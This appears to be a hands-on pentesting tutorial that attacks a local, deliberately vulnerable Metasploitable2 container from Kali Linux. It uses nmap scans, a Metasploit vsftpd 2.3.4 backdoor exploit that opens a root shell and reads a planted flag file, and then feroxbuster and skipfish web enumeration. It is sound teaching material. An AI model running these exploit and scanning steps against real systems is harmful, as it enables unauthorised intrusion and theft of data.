# Example: Scanning for Vulnerabilities


### Setup a vulnerable 'victim' container we can exploit
Here we start a vulnerable container with the metasploitable2 image which has a ton of old services with vulnerabilities. See more info [here]https://docs.rapid7.com/metasploit/metasploitable-2/
```
    # Setup a network for the containers
    docker network create pentest

    # Run the vulnerable docker container
    docker run -it --network=pentest -h victim --name vulnerable.aa tleemcjr/metasploitable2

    # Create a very important secret on the vulnerable container
    echo 'flag{important_password_here}' > /root/important.txt

    # Keep the terminal open throughout the exercise.
```

**Note**: We named the vulnerable docker container `vulnerable.aa` and anyone on the docker network can now access it with this name. Docker will redirect requests to this container, in a similar way dns would to any other server. 'vulnerable.aa' could be replaced with any website for any of the used tools.

### Installing Kali Linux
Kali linux is a linux distribution which comes with many tools often used for security testing. Here we use the docker version, which does not come with as many tools, but they can easily be installed, and we can access the vulnerable container on the same docker network.

```
    # Installing Kali Linux in Docker
    docker run -it --rm --network pentest kalilinux/kali-last-release /bin/bash

    # Update list of packages which can be installed
    apt update
```


### Port scanning with nmap
Let's first try using [**nmap**: the Network Mapper](https://nmap.org/). It is a free tool which can be installed in kali with `apt install nmap -y`.

Using the Kali Linux Docker container from above, you can perform port scans on hosts of your choosing. Only do this on your own systems. 

To perform a simple port scan you can run `nmap <ip>`. If you scan the vulnerable container you should the the following output:

```
┌──(root㉿42790269161b)-[/]
└─# nmap vulnerable.aa
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 19:32 UTC
Nmap scan report for vulnerable.aa (172.20.0.4)
Host is up (0.000013s latency).
rDNS record for 172.20.0.4: vulnerable.aa.pentest
Not shown: 979 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 02:42:AC:14:00:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds

```

To probe open ports for service and version info, you can add the `-sV` flags. You can then check the services reported by nmap for vulnerabilities online, fx using [CVEdetails](https://www.cvedetails.com/).
Since the vulnerable container has a lot of services, we can limit the port range to 0-100 with the flag `-p0-100`.

```
┌──(root㉿42790269161b)-[/]
└─# nmap -sV -p0-100 vulnerable.aa
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 19:30 UTC
Nmap scan report for vulnerable.aa (172.20.0.4)
Host is up (0.000013s latency).
rDNS record for 172.20.0.4: vulnerable.aa.pentest
Not shown: 96 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open  telnet  Linux telnetd
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
MAC Address: 02:42:AC:14:00:04 (Unknown)
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.27 seconds
```



### Setting up Metasploit
Metasploit is a framework which has a ton of scripts that exploit services. We can interact with it through msfconsole, and automate the exploit process. 
```
    # In the Kali container:
    apt install metasploit-framework -y  #takes a few minutes

    # Starting metasploit
    service postgresql start
    msfdb reinit # if this is the first time you are running metasploit
    msfconsole
```

In the nmap port scan we saw that port 21 was open with ftp running vsftpd 2.3.4. Now inside metasploit, let's see if there are any exploits defined for this version:

```
msf6 > search vsftpd
    
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


```

We can see that there is an exploit, in this case a backdoor, for this version. Let's exploit it and gain access to the container.
```
    # Select the exploit
    use 1

    # Set the target host and port
    set rhosts vulnerable.aa
    set rport 21

    # Execute the exploit
    exploit

```

You should get a message saying `Command shell session 1 opened`. You now have what's called a reverse shell, and any commands you type will be run on the exploited server.

```
[*] Command shell session 1 opened (172.20.0.2:34711 -> 172.20.0.4:6200) at 2025-04-07 19:42:39 +0000

whoami
root

cat /root/important.txt
flag{important_password_here}
```


### Enumerating a website with feroxbuster
[feroxbuster](https://github.com/epi052/feroxbuster) is a tool which can find website resources, even if they are not referenced on the site (Forced Browsing). You can fx find login pages, or hidden content.

```
    apt install feroxbuster -y
    
    # run the tool with -n for non-recursive, since there are so many webapps on the vulnerable machine.
    feroxbuster -n -u  http://vulnerable.aa/
 ```


### Searching for Vulnerabilities with Skipfish
[Skipfish](https://www.kali.org/tools/skipfish/) is another web application security tool, which can be quite helpful.

```
    # mapping a local folder where the html output is going to be saved
    docker run -v /tmp:/home/$(whoami) -t -i kalilinux/kali-last-release /bin/bash

    # inside the container now
    apt install skipfish -y
    
    # Change <YOUR-PATH> with something like /home/<USERNAME>/Desktop where the html output is going to be saved
    skipfish -o <YOUR-PATH>/report http://vulnerable.aa
 ```


### Learn more
If you want more security/hacking exercises, lookup Capture The Flag(CTF) events, where you find exploits to get a secret text string, called a flag, to earn points. You can check out sites like [picoCTF](https://play.picoctf.org/).